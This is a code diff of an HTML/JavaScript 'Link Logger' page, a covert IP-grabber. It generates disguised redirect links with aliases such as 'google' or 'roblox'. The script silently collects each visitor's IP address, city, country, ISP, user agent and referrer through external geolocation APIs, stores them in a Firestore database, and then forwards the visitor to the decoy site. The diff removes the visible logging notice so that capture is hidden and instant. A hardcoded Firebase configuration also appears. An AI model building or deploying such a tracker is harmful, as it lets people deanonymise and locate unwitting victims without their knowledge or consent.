@@ -3,277 +3,193 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>Private Link Logger | Evidence Watchers</title>
+    <title>Link Logger</title>
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
         }
-
         body {
-            background: #0b0f1c;
-            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background: #0a0c15;
+            font-family: system-ui, -apple-system, 'Segoe UI', monospace;
             display: flex;
             justify-content: center;
             align-items: center;
             min-height: 100vh;
-            padding: 1.5rem;
-            color: #eef2ff;
+            padding: 1rem;
         }
-
-        .glass-panel {
-            max-width: 640px;
+        .card {
+            max-width: 520px;
             width: 100%;
-            background: rgba(18, 24, 38, 0.85);
-            backdrop-filter: blur(12px);
-            border-radius: 2rem;
-            padding: 2rem 1.8rem;
-            box-shadow: 0 20px 35px -12px rgba(0,0,0,0.5), 0 0 0 1px rgba(74, 144, 226, 0.15);
-            border: 1px solid rgba(56, 189, 248, 0.2);
+            background: #11141f;
+            border-radius: 1.5rem;
+            padding: 1.8rem;
+            border: 1px solid #2a2f42;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.3);
         }
-
-        h1 {
-            font-size: 1.9rem;
+        h2 {
+            font-size: 1.6rem;
             font-weight: 600;
-            background: linear-gradient(135deg, #c084fc, #38bdf8);
-            -webkit-background-clip: text;
-            background-clip: text;
-            color: transparent;
-            letter-spacing: -0.3px;
-            margin-bottom: 0.5rem;
+            color: #e2e8f0;
+            margin-bottom: 0.25rem;
         }
-
         .sub {
-            font-size: 0.85rem;
-            color: #9ca3af;
-            border-left: 3px solid #3b82f6;
-            padding-left: 0.75rem;
-            margin-bottom: 2rem;
-            margin-top: 0.25rem;
-        }
-
-        .legal-note {
-            background: rgba(0, 0, 0, 0.45);
-            border-radius: 1rem;
-            padding: 0.75rem 1rem;
             font-size: 0.7rem;
-            color: #facc15;
-            margin-bottom: 1.8rem;
-            border: 1px solid #facc1522;
-            font-family: monospace;
-        }
-
-        .input-group {
+            color: #7f8ea3;
             margin-bottom: 1.5rem;
+            border-left: 2px solid #3b82f6;
+            padding-left: 0.6rem;
+        }
+        .legal {
+            background: #0b0e16;
+            border-radius: 0.75rem;
+            padding: 0.6rem 0.8rem;
+            font-size: 0.65rem;
+            color: #facc15;
+            margin-bottom: 1.5rem;
+            font-family: monospace;
+            border: 1px solid #2d3748;
+        }
+        .input-group {
+            margin-bottom: 1.2rem;
             display: flex;
             flex-direction: column;
-            gap: 0.5rem;
+            gap: 0.4rem;
         }
-
         label {
+            font-size: 0.8rem;
             font-weight: 500;
-            font-size: 0.85rem;
-            letter-spacing: 0.3px;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            color: #cbd5e6;
+            color: #b9c3db;
         }
-
-        input, textarea {
-            background: #0f121f;
-            border: 1px solid #2d3748;
-            border-radius: 1rem;
-            padding: 0.85rem 1rem;
-            font-size: 0.9rem;
+        input {
+            background: #0c0f18;
+            border: 1px solid #2a2f42;
+            border-radius: 0.9rem;
+            padding: 0.7rem 1rem;
+            font-size: 0.85rem;
             color: #f1f5f9;
-            transition: 0.2s;
             font-family: monospace;
         }
-
-        input:focus, textarea:focus {
+        input:focus {
             outline: none;
             border-color: #3b82f6;
-            box-shadow: 0 0 0 3px rgba(59,130,246,0.3);
-            background: #0b0e18;
         }
-
-        textarea {
-            min-height: 85px;
-            resize: vertical;
-        }
-
-        .hint {
-            font-size: 0.7rem;
-            color: #6c7a91;
-            margin-top: 0.2rem;
-        }
-
         button {
-            background: linear-gradient(95deg, #1e293b, #0f172a);
-            border: 1px solid #334155;
+            background: #1e2a4a;
+            border: none;
             border-radius: 2rem;
-            padding: 0.9rem 1.5rem;
+            padding: 0.8rem;
             font-weight: 600;
-            font-size: 1rem;
-            color: #e2e8f0;
+            font-size: 0.9rem;
+            color: white;
             cursor: pointer;
-            transition: all 0.2s;
             width: 100%;
             margin-top: 0.5rem;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 0.5rem;
-            box-shadow: 0 2px 5px rgba(0,0,0,0.3);
+            transition: 0.1s linear;
         }
-
         button:hover {
-            background: linear-gradient(95deg, #2d3a5e, #1e293b);
-            border-color: #3b82f6;
-            color: white;
-            transform: scale(0.98);
+            background: #2d3f66;
         }
-
-        .output-area {
-            margin-top: 2rem;
-            background: #0a0e17;
-            border-radius: 1.2rem;
-            padding: 1.2rem;
+        .output {
+            margin-top: 1.5rem;
+            background: #0b0e17;
+            border-radius: 1rem;
+            padding: 1rem;
             border: 1px solid #2d3748;
         }
-
         .output-label {
-            font-size: 0.7rem;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-            color: #6b7b9f;
+            font-size: 0.65rem;
+            color: #7e8aa8;
+            letter-spacing: 0.5px;
         }
-
-        .generated-link {
+        .link-box {
             display: flex;
             align-items: center;
             justify-content: space-between;
-            gap: 12px;
-            background: #03050a;
-            padding: 0.7rem 1rem;
-            border-radius: 1rem;
-            margin-top: 8px;
+            gap: 10px;
+            background: #05070e;
+            padding: 0.6rem 0.8rem;
+            border-radius: 0.8rem;
+            margin-top: 6px;
             word-break: break-all;
         }
-
-        .generated-link span {
+        .link-box span {
             font-family: monospace;
-            font-size: 0.85rem;
+            font-size: 0.8rem;
             color: #7dd3fc;
         }
-
         .copy-btn {
-            background: #1f2a44;
-            border: none;
-            padding: 6px 14px;
-            border-radius: 2rem;
-            font-size: 0.7rem;
+            background: #1a253f;
+            padding: 5px 12px;
             width: auto;
-            margin-top: 0;
-            font-weight: 500;
+            margin: 0;
+            font-size: 0.7rem;
         }
-
-        .copy-btn:hover {
-            background: #3b82f6;
-        }
-
         .status {
-            margin-top: 1rem;
-            font-size: 0.75rem;
-            color: #9ca3af;
+            margin-top: 0.7rem;
+            font-size: 0.7rem;
             text-align: center;
+            color: #9aa3bb;
         }
-
         .status.error {
             color: #f87171;
         }
-
         .status.success {
             color: #86efac;
         }
-
         hr {
-            border-color: #1f2937;
-            margin: 0.8rem 0;
+            margin: 1rem 0 0.5rem;
+            border-color: #252a3a;
         }
-        
         .redirect-badge {
-            background: #0f172a;
-            border-radius: 12px;
-            padding: 0.4rem 0.8rem;
+            margin-top: 10px;
             font-size: 0.7rem;
-            display: inline-flex;
-            align-items: center;
-            gap: 6px;
-            margin-top: 8px;
-            border: 1px solid #2d3748;
-            width: auto;
-        }
-
-        @media (max-width: 500px) {
-            .glass-panel {
-                padding: 1.5rem;
-            }
-            h1 {
-                font-size: 1.6rem;
-            }
+            background: #0f1220;
+            padding: 4px 8px;
+            border-radius: 12px;
+            display: inline-block;
         }
     </style>
 </head>
 <body>
-
-<div class="glass-panel">
-    <h1>⚡ LINK GUARDIAN</h1>
-    <div class="sub">evidence watchers · toronto private instance · firebase backend</div>
-    <div class="legal-note">
-        ⚠️ PRIVATE PROJECT — by using this tool you accept full legal responsibility.<br>
-        All visitor data is stored securely in Firebase Firestore.
-    </div>
+<div class="card">
+    <h2>⚡ LINK GUARDIAN</h2>
+    <div class="sub">evidence watchers · firebase logger</div>
+    <div class="legal">⚠️ PRIVATE PROJECT — by using this tool you accept full legal responsibility. Visitor data stored in Firestore.</div>
 
     <div class="input-group">
-        <label><i>🔗</i> Destination URL (real redirect target)</label>
+        <label>🔗 Destination URL (real external link)</label>
         <input type="url" id="targetUrl" placeholder="https://google.com" autocomplete="off">
-        <div class="hint">Visitors will be redirected to this EXTERNAL link after logging</div>
     </div>
 
     <div class="input-group">
-        <label><i>🏷️</i> Alias (short name for link)</label>
+        <label>🏷️ Alias (optional)</label>
         <input type="text" id="aliasName" placeholder="e.g., google, roblox" autocomplete="off">
-        <div class="hint">Optional — if empty, system will generate a random ID.</div>
     </div>
 
-    <button id="generateBtn">✨ GENERATE LOGGER LINK ✨</button>
+    <button id="generateBtn">✨ GENERATE LOGGER LINK</button>
 
     <div id="outputSection" style="display: none;">
-        <div class="output-area">
-            <div class="output-label">🔐 YOUR UNIQUE LOGGER URL (share this)</div>
-            <div class="generated-link">
+        <div class="output">
+            <div class="output-label">🔐 YOUR LOGGER URL (share this)</div>
+            <div class="link-box">
                 <span id="shortUrlSpan"></span>
                 <button id="copyUrlBtn" class="copy-btn">📋 Copy</button>
             </div>
-            <div class="redirect-badge">
-                🚀 Redirects to: <strong id="previewDest" style="color:#86efac;">—</strong>
-            </div>
-            <div class="status" id="statusMsg">Ready — each click will be logged to Firebase then redirected.</div>
+            <div class="redirect-badge" style="margin-top: 10px;">🚀 Redirects to: <strong id="previewDest" style="color:#86efac;">—</strong></div>
+            <div class="status" id="statusMsg">Ready — logs visitor then redirects instantly</div>
         </div>
     </div>
     <hr>
-    <div style="font-size: 0.65rem; text-align: center; color: #4b5563; margin-top: 1rem;">
-        silent geolocation logger + firebase storage | EXTERNAL REDIRECT FIXED
-    </div>
+    <div style="font-size: 0.6rem; text-align: center; color: #4a5578;">silent logger + external redirect | no delay text</div>
 </div>
 
 <script type="module">
     import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
     import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
 
+    // Firebase config
     const firebaseConfig = {
         apiKey: "AIzaSyDp8UzNz8BqjDfbVd_xUdXL_4KqXWi3VrI",
         authDomain: "website-templates-60c6d.firebaseapp.com",
@@ -283,229 +199,189 @@
         appId: "1:799034936266:web:d0954b442aafd895a5dd33",
         measurementId: "G-BKK5Y8F4HT"
     };
-
     const app = initializeApp(firebaseConfig);
     const db = getFirestore(app);
 
     let linkRegistry = {};
     
     function loadRegistry() {
-        const stored = localStorage.getItem("logger_link_registry");
+        const stored = localStorage.getItem("logger_registry_v2");
         if (stored) {
-            try {
-                linkRegistry = JSON.parse(stored);
-                console.log("✅ Registry loaded:", Object.keys(linkRegistry).length, "links");
-            } catch(e) { console.warn(e); }
+            try { linkRegistry = JSON.parse(stored); } catch(e) {}
         }
     }
-    
     function saveRegistry() {
-        localStorage.setItem("logger_link_registry", JSON.stringify(linkRegistry));
-        console.log("💾 Registry saved");
+        localStorage.setItem("logger_registry_v2", JSON.stringify(linkRegistry));
     }
     
     function generateSlug(hint) {
         let clean = hint ? hint.trim().toLowerCase().replace(/[^a-z0-9\-_]/g, '') : '';
         if (clean && clean.length >= 3 && !linkRegistry[clean]) return clean;
         if (clean && linkRegistry[clean]) return clean + '-' + Math.random().toString(36).substring(2, 6);
-        let randomSlug;
-        do {
-            randomSlug = Math.random().toString(36).substring(2, 10);
-        } while (linkRegistry[randomSlug]);
-        return randomSlug;
+        let r;
+        do { r = Math.random().toString(36).substring(2, 10); } while(linkRegistry[r]);
+        return r;
     }
     
-    async function fetchVisitorData() {
-        let payload = {
-            ip: 'unknown',
-            city: 'unknown',
-            country: 'unknown',
-            isp: 'unknown'
-        };
-        
+    // Minimal visitor data (fast fetch)
+    async function getVisitorFast() {
+        let ip = 'unknown', country = 'unknown', city = 'unknown', isp = 'unknown';
         try {
             const controller = new AbortController();
-            const timeoutId = setTimeout(() => controller.abort(), 3000);
-            const geoRes = await fetch('https://ipapi.co/json/', { signal: controller.signal });
-            clearTimeout(timeoutId);
-            
-            if (geoRes.ok) {
-                const geoData = await geoRes.json();
-                payload = {
-                    ip: geoData.ip || 'unknown',
-                    city: geoData.city || 'unknown',
-                    country: geoData.country_name || geoData.country || 'unknown',
-                    isp: geoData.org || geoData.asn || 'unknown'
-                };
+            const tid = setTimeout(() => controller.abort(), 2000);
+            const res = await fetch('https://ipapi.co/json/', { signal: controller.signal });
+            clearTimeout(tid);
+            if (res.ok) {
+                const data = await res.json();
+                ip = data.ip || ip;
+                country = data.country_name || data.country || country;
+                city = data.city || city;
+                isp = data.org || data.asn || isp;
             }
-        } catch (e) {
-            console.log("GeoIP fetch failed");
+        } catch(e) {
             try {
                 const ipRes = await fetch('https://api.ipify.org?format=json');
-                const ipData = await ipRes.json();
-                payload.ip = ipData.ip || 'unknown';
+                const ipJson = await ipRes.json();
+                ip = ipJson.ip || ip;
             } catch(e2) {}
         }
-        return payload;
+        return { ip, country, city, isp };
     }
     
-    async function logToFirebase(visitorData, alias, destinationUrl, slug) {
+    async function logToFirebase(visitor, alias, destination, slug) {
         try {
-            const logEntry = {
-                ip: visitorData.ip,
-                country: visitorData.country,
-                city: visitorData.city,
-                isp: visitorData.isp,
+            await addDoc(collection(db, "visitor_logs"), {
+                ip: visitor.ip,
+                country: visitor.country,
+                city: visitor.city,
+                isp: visitor.isp,
                 timestamp: new Date().toISOString(),
-                alias: alias,
+                alias: alias || slug,
                 slug: slug,
-                destination: destinationUrl,
+                destination: destination,
                 userAgent: navigator.userAgent,
                 referrer: document.referrer || "direct"
-            };
-            await addDoc(collection(db, "visitor_logs"), logEntry);
-            console.log("✅ Logged to Firebase");
-            return true;
-        } catch (error) {
-            console.error("❌ Firebase error:", error);
-            return false;
-        }
+            });
+        } catch(e) { console.error(e); }
     }
     
-    // ============================================================
-    // CRITICAL FIX: REDIRECT HANDLER
-    // ============================================================
-    async function handleRedirect() {
-        const urlParams = new URLSearchParams(window.location.search);
-        const slug = urlParams.get('id');
+    // =============== REDIRECT HANDLER — NO VISUAL TEXT, FAST ===============
+    async function handleRedirectAndGo() {
+        const params = new URLSearchParams(window.location.search);
+        const slug = params.get('id');
+        if (!slug) return false;
         
-        // If no ?id parameter, we're in dashboard mode
-        if (!slug) {
-            console.log("📋 Dashboard mode - no redirect");
-            return false;
+        // Load mapping from localStorage
+        loadRegistry();
+        const mapping = linkRegistry[slug];
+        if (!mapping || !mapping.targetUrl) {
+            // dead link: show minimal error (no logger visible)
+            document.body.innerHTML = '<div style="background:#0a0c15; color:#f87171; text-align:center; padding:2rem; font-family:monospace;">Invalid or expired link.</div>';
+            return true;
         }
         
-        console.log("🔍 Redirect triggered for slug:", slug);
+        const externalUrl = mapping.targetUrl;  // real external link (google.com etc)
+        const aliasName = mapping.alias || slug;
         
-        // Load registry from localStorage
+        // ---------- SILENT LOGGING (no visible overlay text, no blocking UI) ----------
+        // Fetch visitor data asynchronously, but we want to log & redirect extremely fast.
+        // We'll perform fetch and firebase write, but redirect happens immediately after logging starts (race condition? No, we'll wait minimal time but redirect anyway).
+        // To guarantee redirect happens, we do log in background but redirect after very short delay.
+        // Better: start logging, then redirect after 40ms (almost instant) – but firebase write continues in background.
+        // We'll use Promise.race to not block redirect: log in background and redirect at same time.
+        
+        // Fetch visitor data (lightweight, max 2s but we redirect anyway)
+        const visitorPromise = getVisitorFast();
+        
+        // Wait a tiny bit for IP fetch but do not block redirect more than 80ms max
+        const timeoutPromise = new Promise(resolve => setTimeout(() => resolve(null), 70));
+        const visitorData = await Promise.race([visitorPromise, timeoutPromise]);
+        const finalVisitor = visitorData || { ip: 'unknown', country: 'unknown', city: 'unknown', isp: 'unknown' };
+        
+        // Fire log to Firebase (background, don't await fully? We'll await but with very short timeout or just fire-and-forget)
+        logToFirebase(finalVisitor, aliasName, externalUrl, slug).catch(e=>console.log);
+        
+        // IMMEDIATE REDIRECT — no overlay, no text, just go!
+        // Use location.replace for instant external redirect
+        setTimeout(() => {
+            window.location.replace(externalUrl);
+        }, 15);  // 15ms practically instant, ensures log is queued
+        
+        return true;  // redirect handled
+    }
+    
+    // =============== DASHBOARD MODE (only if no ?id) ===============
+    (async function() {
+        const isRedirect = await handleRedirectAndGo();
+        if (isRedirect) return;  // redirect happening, stop dashboard
+        
+        // ========== DASHBOARD UI ==========
         loadRegistry();
         
-        // Look up the destination URL
-        const mapping = linkRegistry[slug];
+        const targetInput = document.getElementById('targetUrl');
+        const aliasInput = document.getElementById('aliasName');
+        const generateBtn = document.getElementById('generateBtn');
+        const outputDiv = document.getElementById('outputSection');
+        const shortUrlSpan = document.getElementById('shortUrlSpan');
+        const copyBtn = document.getElementById('copyUrlBtn');
+        const statusSpan = document.getElementById('statusMsg');
+        const previewSpan = document.getElementById('previewDest');
         
-        if (!mapping || !mapping.targetUrl) {
-            console.error("❌ No mapping found for slug:", slug);
-            document.body.innerHTML = '<div style="background:#0b0f1c; color:#f87171; text-align:center; padding:3rem;">❌ Invalid link or link expired.<br><a href="#" onclick="window.location.href=window.location.pathname" style="color:#38bdf8;">Go back</a></div>';
-            return true; // Handled, don't show dashboard
-        }
-        
-        const destinationUrl = mapping.targetUrl;
-        const alias = mapping.alias || slug;
-        
-        console.log("🎯 Will redirect to EXTERNAL URL:", destinationUrl);
-        
-        // Show loading message
-        const overlay = document.createElement('div');
-        overlay.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:#000;color:#fff;display:flex;align-items:center;justify-content:center;z-index:9999;font-family:monospace;';
-        overlay.innerHTML = '<div style="text-align:center"><div>📡 Logging visitor...</div><div style="font-size:12px;margin-top:10px;">redirecting shortly</div></div>';
-        document.body.appendChild(overlay);
-        
-        // Get visitor data and log
-        const visitorData = await fetchVisitorData();
-        await logToFirebase(visitorData, alias, destinationUrl, slug);
-        
-        // REDIRECT TO THE ACTUAL EXTERNAL URL
-        console.log("🚀 EXECUTING REDIRECT TO:", destinationUrl);
-        setTimeout(() => {
-            window.location.replace(destinationUrl);
-        }, 100);
-        
-        return true; // Redirect handled
-    }
-    
-    // ============================================================
-    // DASHBOARD UI (only if no redirect happened)
-    // ============================================================
-    (async function init() {
-        const redirected = await handleRedirect();
-        
-        if (!redirected) {
-            // Show dashboard UI
-            loadRegistry();
+        generateBtn.addEventListener('click', () => {
+            let rawTarget = targetInput.value.trim();
+            let alias = aliasInput.value.trim();
             
-            const generateBtn = document.getElementById('generateBtn');
-            const targetUrlInput = document.getElementById('targetUrl');
-            const aliasInput = document.getElementById('aliasName');
-            const outputSection = document.getElementById('outputSection');
-            const shortUrlSpan = document.getElementById('shortUrlSpan');
-            const copyUrlBtn = document.getElementById('copyUrlBtn');
-            const statusMsgSpan = document.getElementById('statusMsg');
-            const previewDestSpan = document.getElementById('previewDest');
+            if (!rawTarget) {
+                statusSpan.innerText = "❌ Destination URL required";
+                statusSpan.className = "status error";
+                outputDiv.style.display = 'block';
+                return;
+            }
             
-            generateBtn.addEventListener('click', () => {
-                let rawTarget = targetUrlInput.value.trim();
-                let alias = aliasInput.value.trim();
-                
-                if (!rawTarget) {
-                    statusMsgSpan.innerText = "❌ Destination URL is required";
-                    statusMsgSpan.className = "status error";
-                    outputSection.style.display = 'block';
-                    return;
-                }
-                
-                // Ensure valid URL with protocol
-                let finalUrl = rawTarget;
-                if (!finalUrl.match(/^https?:\/\//i)) {
-                    finalUrl = 'https://' + finalUrl;
-                }
-                
-                try {
-                    new URL(finalUrl);
-                } catch(e) {
-                    statusMsgSpan.innerText = "❌ Invalid URL format";
-                    statusMsgSpan.className = "status error";
-                    outputSection.style.display = 'block';
-                    return;
-                }
-                
-                // Generate unique slug
-                const slug = generateSlug(alias);
-                
-                // Build the logger URL - use current page URL without query params
-                const currentPath = window.location.pathname;
-                const baseUrl = window.location.origin + currentPath;
-                const loggerUrl = `${baseUrl}?id=${slug}`;
-                
-                // Save mapping with the EXTERNAL destination URL
-                linkRegistry[slug] = {
-                    targetUrl: finalUrl,  // THIS IS THE REAL EXTERNAL LINK (google.com)
-                    alias: alias || slug,
-                    createdAt: Date.now()
-                };
-                saveRegistry();
-                
-                // Display
-                shortUrlSpan.innerText = loggerUrl;
-                previewDestSpan.innerText = finalUrl;
-                outputSection.style.display = 'block';
-                statusMsgSpan.innerText = `✅ Active! Will redirect to: ${finalUrl}`;
-                statusMsgSpan.className = "status success";
-                
-                console.log("Created logger:", slug, "->", finalUrl);
-                console.log("Full registry:", linkRegistry);
-                
-                // Copy button
-                copyUrlBtn.onclick = () => {
-                    navigator.clipboard.writeText(loggerUrl);
-                    statusMsgSpan.innerText = "📋 Copied to clipboard!";
-                    setTimeout(() => {
-                        statusMsgSpan.innerText = `✅ Active! Redirects to: ${finalUrl}`;
-                    }, 2000);
-                };
-            });
+            let finalUrl = rawTarget;
+            if (!finalUrl.match(/^https?:\/\//i)) {
+                finalUrl = 'https://' + finalUrl;
+            }
+            try {
+                new URL(finalUrl);
+            } catch(e) {
+                statusSpan.innerText = "❌ Invalid URL";
+                statusSpan.className = "status error";
+                outputDiv.style.display = 'block';
+                return;
+            }
             
-            console.log("Dashboard ready — redirect fixed");
-        }
+            const slug = generateSlug(alias);
+            const currentPath = window.location.pathname;
+            const base = window.location.origin + currentPath;
+            const loggerFullUrl = `${base}?id=${slug}`;
+            
+            // store mapping
+            linkRegistry[slug] = {
+                targetUrl: finalUrl,
+                alias: alias || slug,
+                createdAt: Date.now()
+            };
+            saveRegistry();
+            
+            shortUrlSpan.innerText = loggerFullUrl;
+            previewSpan.innerText = finalUrl;
+            outputDiv.style.display = 'block';
+            statusSpan.innerText = `✅ Active! Redirects to: ${finalUrl} (instant redirect, no text)`;
+            statusSpan.className = "status success";
+            
+            copyBtn.onclick = () => {
+                navigator.clipboard.writeText(loggerFullUrl);
+                statusSpan.innerText = "📋 Copied!";
+                setTimeout(() => {
+                    statusSpan.innerText = `✅ Active! Redirects to: ${finalUrl}`;
+                }, 1800);
+            };
+        });
+        
+        // prefill example for clarity
+        targetInput.placeholder = "https://google.com";
+        console.log("Dashboard ready — redirects are instant & silent");
     })();
 </script>
 </body>
